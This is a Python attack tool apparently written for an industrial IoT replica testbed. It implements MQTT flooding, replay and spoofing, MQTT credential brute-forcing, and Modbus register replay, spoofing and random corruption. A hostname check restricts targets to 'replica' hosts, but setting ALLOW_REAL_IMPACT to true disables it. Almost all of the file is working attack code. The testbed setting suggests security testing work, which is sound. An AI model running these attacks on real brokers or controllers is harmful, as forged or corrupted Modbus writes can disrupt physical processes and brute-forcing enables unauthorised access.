import os
import time
import json
import threading
import random
import sys

import paho.mqtt.publish as publish
import paho.mqtt.client as mqtt
from pymodbus.client.sync import ModbusTcpClient
import base64

ATTACK_TYPE = os.getenv('ATTACK_TYPE', 'high_rate_pub')
TARGET_BROKER = os.getenv('TARGET_BROKER', 'replica_mosquitto')
TARGET_MODBUS_HOST = os.getenv('TARGET_MODBUS_HOST', 'replica_modbus_slave_1')
TARGET_MODBUS_PORT = int(os.getenv('TARGET_MODBUS_PORT', '2502'))
DURATION = int(os.getenv('DURATION', '10'))
RATE = int(os.getenv('RATE', '100'))
REPLAY_FILE = os.getenv('REPLAY_FILE', '/data/mqtt_replay.json')
MODBUS_REPLAY_FILE = os.getenv('MODBUS_REPLAY_FILE', '/data/modbus_replay.jsonl')
REPLAY_SCALE = float(os.getenv('REPLAY_SCALE', '1.0'))
SPOOF_TOPIC = os.getenv('SPOOF_TOPIC', 'sensors/attacker/telemetry')
SPOOF_VALUE = os.getenv('SPOOF_VALUE', '')
SPOOF_RATE = int(os.getenv('SPOOF_RATE', '1'))
AUTH_USER_FILE = os.getenv('AUTH_USER_FILE', '/data/usernames.txt')
AUTH_PASS_FILE = os.getenv('AUTH_PASS_FILE', '/data/passwords.txt')
AUTH_RATE = int(os.getenv('AUTH_RATE', '10'))
MODBUS_SPOOF_ADDR = int(os.getenv('MODBUS_SPOOF_ADDR', '0'))
MODBUS_SPOOF_COUNT = int(os.getenv('MODBUS_SPOOF_COUNT', '10'))
MODBUS_SPOOF_VALUE = int(os.getenv('MODBUS_SPOOF_VALUE', '123'))
# Safety: by default only allow attacking hosts that match these prefixes (comma-separated)
SAFE_PREFIXES = os.getenv('SAFE_PREFIXES', 'replica')
# Allow explicit override to target non-replica hosts (defaults to 'false')
ALLOW_REAL_IMPACT = os.getenv('ALLOW_REAL_IMPACT', 'false')
# Optional comma-separated list of replica targets (DNS names reachable from attacker)
REPLICA_TARGETS = [t.strip() for t in os.getenv('REPLICA_TARGETS', f"{TARGET_BROKER},{TARGET_MODBUS_HOST}").split(',') if t.strip()]


def is_safe_target(hostname: str) -> bool:
    """Return True if hostname is allowed to be attacked under current safety settings.

    By default only hostnames containing one of the SAFE_PREFIXES are allowed.
    The environment variable ALLOW_REAL_IMPACT can override this (set to 'true').
    """
    if not hostname:
        return False
    if ALLOW_REAL_IMPACT.lower() in ('1', 'true', 'yes'):
        return True
    # allow common localhost targets
    if hostname in ('localhost', '127.0.0.1'):
        return True
    for p in SAFE_PREFIXES.split(','):
        p = p.strip()
        if not p:
            continue
        if p in hostname:
            return True
    return False

def high_rate_publish(duration, rate):
    # safety check
    if not is_safe_target(TARGET_BROKER):
        print('refusing to run high_rate_publish: unsafe target', TARGET_BROKER)
        return
    end = None if duration <= 0 else time.time() + duration
    i = 0
    while end is None or time.time() < end:
        try:
            publish.single('sensors/attacker/telemetry', json.dumps({'idx': i, 'v': random.random()}), hostname=TARGET_BROKER)
        except Exception as e:
            print('publish error', e)
        i += 1
        time.sleep(1.0 / max(1, rate))


def mqtt_replay(file_path, duration=None, scale=1.0, hostname=None):
    """Replay messages from a JSON-lines file with optional time-scaling.

    Each line should be a JSON object with at least: topic, payload, ts (unix float).
    """
    hostname = hostname or TARGET_BROKER
    if not is_safe_target(hostname):
        print('refusing to run mqtt_replay: unsafe target', hostname)
        return
    if not os.path.exists(file_path):
        print('replay file not found', file_path)
        return
    msgs = []
    with open(file_path, 'r') as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                msgs.append(obj)
            except Exception as e:
                print('skipping bad line in replay file', e)
    if not msgs:
        print('no messages to replay')
        return
    start_ts = msgs[0].get('ts', time.time())
    start_play = time.time()
    end_time = None if not duration or duration <= 0 else start_play + duration
    for m in msgs:
        if end_time and time.time() > end_time:
            break
        msg_ts = m.get('ts', start_ts)
        delay = (msg_ts - start_ts) / max(1e-6, scale)
        target_time = start_play + delay
        to_sleep = target_time - time.time()
        if to_sleep > 0:
            time.sleep(to_sleep)
        try:
            payload = m.get('payload')
            # If the payload was stored as BASE64::... we decode it back to raw bytes
            if isinstance(payload, str) and payload.startswith('BASE64::'):
                try:
                    b = base64.b64decode(payload.split('::', 1)[1])
                    # paho.publish.single accepts bytes for payload
                    publish.single(m.get('topic'), b, hostname=hostname)
                    continue
                except Exception as e:
                    print('failed to decode BASE64 payload, falling back to raw string', e)
            publish.single(m.get('topic'), payload, hostname=hostname)
        except Exception as e:
            print('replay publish error', e)


def modbus_replay(file_path, duration=None, host=None, port=None):
    host = host or TARGET_MODBUS_HOST
    port = port or TARGET_MODBUS_PORT
    if not is_safe_target(host):
        print('refusing to run modbus_replay: unsafe target', host)
        return
    if not os.path.exists(file_path):
        print('modbus replay file not found', file_path)
        return
    events = []
    with open(file_path, 'r') as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                events.append(obj)
            except Exception as e:
                print('skipping bad line in modbus replay', e)
    if not events:
        print('no modbus events to replay')
        return
    client = ModbusTcpClient(host, port=port)
    client.connect()
    try:
        start_ts = events[0].get('ts', time.time())
        start_play = time.time()
        end_time = None if not duration or duration <= 0 else start_play + duration
        for ev in events:
            if end_time and time.time() > end_time:
                break
            ev_ts = ev.get('ts', start_ts)
            delay = (ev_ts - start_ts)
            target_time = start_play + delay
            to_sleep = target_time - time.time()
            if to_sleep > 0:
                time.sleep(to_sleep)
            try:
                unit = ev.get('unit', 1)
                addr = ev.get('address', 0)
                vals = ev.get('values', [])
                if vals:
                    client.write_registers(addr, vals, unit=unit)
                    print('replayed modbus write', addr, len(vals))
            except Exception as e:
                print('modbus replay error', e)
    finally:
        client.close()


def mqtt_spoof(topic, template_value, duration, rate, hostname=None):
    hostname = hostname or TARGET_BROKER
    if not is_safe_target(hostname):
        print('refusing to run mqtt_spoof: unsafe target', hostname)
        return
    end = None if duration <= 0 else time.time() + duration
    i = 0
    while end is None or time.time() < end:
        payload = template_value
        if payload == '' or payload is None:
            payload = json.dumps({'spoof_idx': i, 'value': random.random()})
        try:
            publish.single(topic, payload, hostname=hostname)
        except Exception as e:
            print('mqtt spoof publish error', e)
        i += 1
        time.sleep(1.0 / max(1, rate))


def modbus_spoof(start_address, count, value, duration, host=None, port=None):
    host = host or TARGET_MODBUS_HOST
    port = port or TARGET_MODBUS_PORT
    if not is_safe_target(host):
        print('refusing to run modbus_spoof: unsafe target', host)
        return
    client = ModbusTcpClient(host, port=port)
    client.connect()
    try:
        end = None if duration <= 0 else time.time() + duration
        regs = [value] * count
        while end is None or time.time() < end:
            try:
                client.write_registers(start_address, regs, unit=1)
                print('modbus spoof wrote', start_address, count)
            except Exception as e:
                print('modbus spoof error', e)
            time.sleep(1)
    finally:
        client.close()


def mqtt_auth_bruteforce(userfile, passfile, hostname=None, rate=10, duration=10):
    hostname = hostname or TARGET_BROKER
    if not is_safe_target(hostname):
        print('refusing to run mqtt_auth_bruteforce: unsafe target', hostname)
        return
    if not os.path.exists(userfile) or not os.path.exists(passfile):
        print('auth files missing', userfile, passfile)
        return
    with open(userfile, 'r') as uf:
        users = [l.strip() for l in uf if l.strip()]
    with open(passfile, 'r') as pf:
        pwds = [l.strip() for l in pf if l.strip()]
    combos = []
    for u in users:
        for p in pwds:
            combos.append((u, p))
    end = None if duration <= 0 else time.time() + duration
    i = 0
    successes = []
    while time.time() < end and i < len(combos):
        u, p = combos[i]
        try:
            client = mqtt.Client()
            client.username_pw_set(u, p)
            client.connect(hostname)
            client.loop_start()
            time.sleep(0.2)
            client.loop_stop()
            client.disconnect()
            print('auth success?', u, p)
            successes.append((u, p))
        except Exception as e:
            print('auth attempt failed', u, p)
        i += 1
        time.sleep(1.0 / max(1, rate))
    print('auth brute finished, successes:', len(successes))

def modbus_corrupt(duration):
    end = None if duration <= 0 else time.time() + duration
    client = ModbusTcpClient(TARGET_MODBUS_HOST, port=TARGET_MODBUS_PORT)
    if not is_safe_target(TARGET_MODBUS_HOST):
        print('refusing to run modbus_corrupt: unsafe target', TARGET_MODBUS_HOST)
        return
    client.connect()
    try:
        while end is None or time.time() < end:
            try:
                regs = [random.randint(0, 65535) for _ in range(50)]
                client.write_registers(0, regs, unit=1)
                print('wrote corrupt registers', regs[:5])
            except Exception as e:
                print('modbus write error', e)
            time.sleep(1)
    finally:
        client.close()

def fuzz_publish(duration):
    end = time.time() + duration
    payloads = ['{', 'true', '[]', 'A'*10000, json.dumps({'x': None}), '\x00\x01\x02']
    while time.time() < end:
        p = random.choice(payloads)
        try:
            if not is_safe_target(TARGET_BROKER):
                print('refusing to run fuzz_publish: unsafe target', TARGET_BROKER)
                return
            publish.single('sensors/fuzz/telemetry', p, hostname=TARGET_BROKER)
        except Exception as e:
            print('fuzz publish error', e)
        time.sleep(0.1)


def network_wide_mqtt_spoof(topic, template_value, duration, rate, targets=None):
    """Publish spoofed messages to all targets listed in REPLICA_TARGETS (safe-by-default)."""
    targets = targets or REPLICA_TARGETS
    for t in targets:
        if not is_safe_target(t):
            print('skipping unsafe target', t)
            continue
        # simple fire-and-forget per target
        threading.Thread(target=mqtt_spoof, args=(topic, template_value, duration, rate, t), daemon=True).start()

def main():
    print('attacker starting', ATTACK_TYPE)
    # Allow overriding via command-line args: first arg is attack type
    if len(sys.argv) > 1:
        attack = sys.argv[1]
    else:
        attack = ATTACK_TYPE

    if attack in ('high_rate_pub', 'ddos'):
        high_rate_publish(DURATION, RATE)
    elif attack == 'modbus_corrupt':
        modbus_corrupt(DURATION)
    elif attack == 'fuzz':
        fuzz_publish(DURATION)
    elif attack == 'mqtt_replay':
        mqtt_replay(REPLAY_FILE, duration=DURATION, scale=REPLAY_SCALE)
    elif attack == 'modbus_replay':
        modbus_replay(MODBUS_REPLAY_FILE, duration=DURATION)
    elif attack == 'mqtt_spoof':
        mqtt_spoof(SPOOF_TOPIC, SPOOF_VALUE, DURATION, SPOOF_RATE)
    elif attack == 'network_wide_mqtt_spoof':
        network_wide_mqtt_spoof(SPOOF_TOPIC, SPOOF_VALUE, DURATION, SPOOF_RATE)
    elif attack == 'modbus_spoof':
        modbus_spoof(MODBUS_SPOOF_ADDR, MODBUS_SPOOF_COUNT, MODBUS_SPOOF_VALUE, DURATION)
    elif attack == 'auth_bruteforce':
        mqtt_auth_bruteforce(AUTH_USER_FILE, AUTH_PASS_FILE, hostname=TARGET_BROKER, rate=AUTH_RATE, duration=DURATION)
    else:
        print('unknown ATTACK_TYPE', attack)

if __name__ == '__main__':
    main()
